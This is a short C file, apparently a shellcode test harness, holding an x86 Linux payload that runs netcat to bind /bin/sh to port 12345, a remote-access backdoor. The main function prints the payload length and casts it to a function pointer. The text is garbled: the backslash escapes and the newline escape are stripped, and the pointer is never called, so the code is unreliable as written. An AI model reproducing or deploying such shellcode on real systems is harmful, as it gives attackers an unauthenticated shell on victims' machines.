#include<stdio.h>

#include<string.h>

unsigned char shellcode[] =
"x31xd2x52x68x32x33x34x35x68x2dx76x70x31x89xe6x52x68x2fx2fx73x68"
"x68x2fx62x69x6ex68x2dx6cx65x2fx89xe7x52x68x2fx2fx6ex63x68x2fx62"
"x69x6ex89xe3x52x56x57x53x89xe1x31xc0xb0x0bxcdx80";
main()
{
    printf("Shellcode Length: %dn",strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;

}

